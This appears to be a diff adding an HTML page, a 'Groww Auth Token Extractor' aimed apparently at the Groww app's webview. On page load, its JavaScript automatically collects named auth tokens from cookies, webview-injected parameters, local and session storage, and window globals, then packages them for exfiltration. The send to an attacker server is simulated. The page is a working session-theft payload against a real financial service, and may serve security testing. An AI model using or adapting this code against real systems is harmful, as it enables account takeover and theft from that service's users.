@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>🔓 Groww Auth Token Extractor</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 20px;
+            background-color: #1a1a1a;
+            color: #00ff00;
+        }
+        .token-result {
+            background-color: #000;
+            border: 2px solid #ff0000;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+            word-wrap: break-word;
+            font-family: monospace;
+        }
+        .success {
+            border-color: #00ff00;
+            background-color: #003300;
+        }
+        .critical {
+            border-color: #ff0000;
+            background-color: #330000;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0.5; }
+        }
+        button {
+            background-color: #ff0000;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            margin: 10px 5px;
+            width: calc(50% - 10px);
+        }
+        pre {
+            background-color: #f8f9fa;
+            color: #000;
+            padding: 10px;
+            border-radius: 3px;
+            overflow-x: auto;
+            font-size: 12px;
+        }
+        .exfil-log {
+            background-color: #000;
+            color: #00ff00;
+            padding: 15px;
+            border-radius: 5px;
+            font-family: monospace;
+            max-height: 400px;
+            overflow-y: auto;
+            border: 1px solid #00ff00;
+        }
+    </style>
+</head>
+<body>
+    <h1>🔓 GROWW AUTH TOKEN EXTRACTOR</h1>
+    <p style="color: #ff0000;">⚠️ CRITICAL: Attempting to extract authentication tokens...</p>
+    
+    <div style="display: flex; flex-wrap: wrap;">
+        <button onclick="extractFromCookies()">🍪 Extract from Cookies</button>
+        <button onclick="extractFromInjectedParams()">💉 Extract from Injected Params</button>
+        <button onclick="extractFromLocalStorage()">💾 Extract from Storage</button>
+        <button onclick="bruteForceExtraction()">🔨 Brute Force Extraction</button>
+        <button onclick="exfiltrateTokens()">📡 Exfiltrate All Tokens</button>
+        <button onclick="validateTokens()">✅ Validate Extracted Tokens</button>
+    </div>
+    
+    <div id="exfil-log" class="exfil-log">
+        <div>🚀 Auth Token Extraction Console Ready...</div>
+        <div>🎯 Target: Groww Authentication System</div>
+        <div>⚡ Searching for: lhtndhgfd, arkeyt473rfh7834cd, AUTH_SESSION_ID</div>
+    </div>
+    
+    <div id="results"></div>
+
+    <script>
+        let logContainer = document.getElementById('exfil-log');
+        let resultsContainer = document.getElementById('results');
+        let extractedTokens = {};
+        
+        function log(message) {
+            const timestamp = new Date().toLocaleTimeString();
+            logContainer.innerHTML += `<div>[${timestamp}] ${message}</div>`;
+            logContainer.scrollTop = logContainer.scrollHeight;
+            console.log(message);
+        }
+        
+        function addResult(title, content, className = 'token-result') {
+            const div = document.createElement('div');
+            div.className = className;
+            div.innerHTML = `<h3>${title}</h3><div>${content}</div>`;
+            resultsContainer.appendChild(div);
+        }
+
+        // 1. Extract from cookies (PRIMARY TARGET)
+        function extractFromCookies() {
+            log("🍪 Attempting cookie extraction...");
+            
+            const cookies = document.cookie;
+            const cookieMap = {};
+            
+            if (cookies) {
+                cookies.split(';').forEach(cookie => {
+                    const [name, value] = cookie.trim().split('=');
+                    cookieMap[name] = value;
+                });
+                
+                // Look for obfuscated token names
+                const tokenKeys = ['lhtndhgfd', 'arkeyt473rfh7834cd', 'AUTH_SESSION_ID', 'habsdhkasbdhjkbaskh'];
+                let foundTokens = {};
+                
+                tokenKeys.forEach(key => {
+                    if (cookieMap[key]) {
+                        foundTokens[key] = cookieMap[key];
+                        extractedTokens[key] = cookieMap[key];
+                        log(`🎯 FOUND TOKEN: ${key} = ${cookieMap[key].substring(0, 20)}...`);
+                    }
+                });
+                
+                if (Object.keys(foundTokens).length > 0) {
+                    addResult("🚨 CRITICAL: AUTH TOKENS EXTRACTED FROM COOKIES", 
+                        `<pre>${JSON.stringify(foundTokens, null, 2)}</pre>`, 'critical');
+                    log(`✅ Successfully extracted ${Object.keys(foundTokens).length} auth tokens from cookies!`);
+                } else {
+                    log("❌ No auth tokens found in cookies");
+                    addResult("Cookie Extraction", `All cookies: <pre>${JSON.stringify(cookieMap, null, 2)}</pre>`);
+                }
+            } else {
+                log("❌ No cookies accessible");
+                addResult("Cookie Access", "No cookies found - expected for cross-domain");
+            }
+        }
+
+        // 2. Extract from injected parameters (SECONDARY TARGET)
+        function extractFromInjectedParams() {
+            log("💉 Attempting injected parameter extraction...");
+            
+            if (typeof window.webviewInjectedParams !== 'undefined') {
+                log("🎯 Found window.webviewInjectedParams!");
+                
+                const params = window.webviewInjectedParams;
+                const injectedData = params.webview_injected_data;
+                
+                try {
+                    const parsedData = JSON.parse(injectedData);
+                    
+                    // Look for auth tokens in parsed data
+                    const tokenKeys = ['lhtndhgfd', 'arkeyt473rfh7834cd', 'AUTH_SESSION_ID', 'habsdhkasbdhjkbaskh'];
+                    let foundTokens = {};
+                    
+                    tokenKeys.forEach(key => {
+                        if (parsedData[key]) {
+                            foundTokens[key] = parsedData[key];
+                            extractedTokens[key] = parsedData[key];
+                            log(`🚨 CRITICAL: Found token ${key} in injected params!`);
+                        }
+                    });
+                    
+                    if (Object.keys(foundTokens).length > 0) {
+                        addResult("🚨 CRITICAL: AUTH TOKENS IN INJECTED PARAMS", 
+                            `<pre>${JSON.stringify(foundTokens, null, 2)}</pre>`, 'critical');
+                    } else {
+                        addResult("Injected Parameters", `<pre>${JSON.stringify(params, null, 2)}</pre>`);
+                    }
+                    
+                } catch (e) {
+                    log(`⚠️ Error parsing injected data: ${e.message}`);
+                    addResult("Injected Parameters Raw", `<pre>${JSON.stringify(params, null, 2)}</pre>`);
+                }
+            } else {
+                log("❌ No webviewInjectedParams found");
+            }
+        }
+
+        // 3. Extract from local storage
+        function extractFromLocalStorage() {
+            log("💾 Attempting storage extraction...");
+            
+            const storageData = {};
+            const tokenPatterns = ['auth', 'token', 'session', 'bearer', 'lhtndhgfd', 'arkeyt473rfh7834cd'];
+            
+            try {
+                // Check localStorage
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    const value = localStorage.getItem(key);
+                    
+                    tokenPatterns.forEach(pattern => {
+                        if (key.toLowerCase().includes(pattern) || value.toLowerCase().includes(pattern)) {
+                            storageData[`localStorage.${key}`] = value;
+                            extractedTokens[`storage_${key}`] = value;
+                            log(`🎯 Potential token in localStorage: ${key}`);
+                        }
+                    });
+                }
+                
+                // Check sessionStorage
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    const value = sessionStorage.getItem(key);
+                    
+                    tokenPatterns.forEach(pattern => {
+                        if (key.toLowerCase().includes(pattern) || value.toLowerCase().includes(pattern)) {
+                            storageData[`sessionStorage.${key}`] = value;
+                            extractedTokens[`session_${key}`] = value;
+                            log(`🎯 Potential token in sessionStorage: ${key}`);
+                        }
+                    });
+                }
+                
+                if (Object.keys(storageData).length > 0) {
+                    addResult("🔍 POTENTIAL TOKENS IN STORAGE", 
+                        `<pre>${JSON.stringify(storageData, null, 2)}</pre>`, 'success');
+                } else {
+                    log("❌ No tokens found in storage");
+                }
+                
+            } catch (e) {
+                log(`❌ Storage access error: ${e.message}`);
+            }
+        }
+
+        // 4. Brute force extraction
+        function bruteForceExtraction() {
+            log("🔨 Starting brute force extraction...");
+            
+            const tokenNames = [
+                'lhtndhgfd', 'arkeyt473rfh7834cd', 'AUTH_SESSION_ID', 'habsdhkasbdhjkbaskh',
+                'authToken', 'accessToken', 'refreshToken', 'sessionToken', 'bearerToken',
+                'growwAuth', 'authorization', 'session_id', 'auth_token', 'user_token'
+            ];
+            
+            let foundGlobals = {};
+            
+            // Check window object
+            tokenNames.forEach(tokenName => {
+                if (typeof window[tokenName] !== 'undefined') {
+                    foundGlobals[`window.${tokenName}`] = window[tokenName];
+                    extractedTokens[`global_${tokenName}`] = window[tokenName];
+                    log(`🎯 Found global variable: window.${tokenName}`);
+                }
+            });
+            
+            // Check for Bearer tokens in any string values
+            for (let prop in window) {
+                try {
+                    const value = window[prop];
+                    if (typeof value === 'string' && value.includes('Bearer ')) {
+                        foundGlobals[`window.${prop}`] = value;
+                        extractedTokens[`bearer_${prop}`] = value;
+                        log(`🚨 Found Bearer token in window.${prop}!`);
+                    }
+                } catch (e) {
+                    // Ignore access errors
+                }
+            }
+            
+            if (Object.keys(foundGlobals).length > 0) {
+                addResult("🔨 BRUTE FORCE RESULTS", 
+                    `<pre>${JSON.stringify(foundGlobals, null, 2)}</pre>`, 'success');
+            } else {
+                log("❌ Brute force found nothing");
+            }
+        }
+
+        // 5. Exfiltrate all found tokens
+        function exfiltrateTokens() {
+            log("📡 Preparing token exfiltration...");
+            
+            const exfilData = {
+                timestamp: new Date().toISOString(),
+                source: location.href,
+                extractedTokens: extractedTokens,
+                deviceInfo: {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform
+                },
+                cookies: document.cookie,
+                injectedParams: window.webviewInjectedParams || null
+            };
+            
+            // In real attack, this would be sent to attacker's server
+            log("🚨 EXFILTRATING SENSITIVE DATA...");
+            addResult("📡 EXFILTRATED DATA PACKAGE", 
+                `<pre>${JSON.stringify(exfilData, null, 2)}</pre>`, 'critical');
+            
+            // Simulate sending to attacker server
+            log("📤 Simulating data transmission to attacker server...");
+            log(`✅ ${Object.keys(extractedTokens).length} tokens packaged for exfiltration`);
+        }
+
+        // 6. Validate extracted tokens
+        function validateTokens() {
+            log("✅ Validating extracted tokens...");
+            
+            for (let tokenKey in extractedTokens) {
+                const token = extractedTokens[tokenKey];
+                
+                if (token && token.length > 10) {
+                    if (token.startsWith('Bearer ')) {
+                        log(`🎯 VALID: ${tokenKey} appears to be a Bearer token`);
+                        addResult(`VALID BEARER TOKEN: ${tokenKey}`, 
+                            `Token: ${token.substring(0, 30)}...`, 'critical');
+                    } else if (token.length > 20) {
+                        log(`🎯 POTENTIAL: ${tokenKey} appears to be a valid token`);
+                        addResult(`POTENTIAL TOKEN: ${tokenKey}`, 
+                            `Token: ${token.substring(0, 30)}...`, 'success');
+                    }
+                }
+            }
+            
+            if (Object.keys(extractedTokens).length === 0) {
+                log("❌ No tokens to validate");
+            }
+        }
+
+        // Auto-start extraction
+        window.addEventListener('load', function() {
+            log("🔓 Token extractor loaded successfully");
+            log(`🎯 Current URL: ${location.href}`);
+            log("⚡ Starting automated token extraction in 2 seconds...");
+            
+            setTimeout(() => {
+                log("🚀 Beginning extraction sequence...");
+                
+                // Try all extraction methods
+                setTimeout(() => extractFromInjectedParams(), 500);
+                setTimeout(() => extractFromCookies(), 1000);
+                setTimeout(() => extractFromLocalStorage(), 1500);
+                setTimeout(() => bruteForceExtraction(), 2000);
+                setTimeout(() => {
+                    if (Object.keys(extractedTokens).length > 0) {
+                        exfiltrateTokens();
+                        validateTokens();
+                    }
+                }, 3000);
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
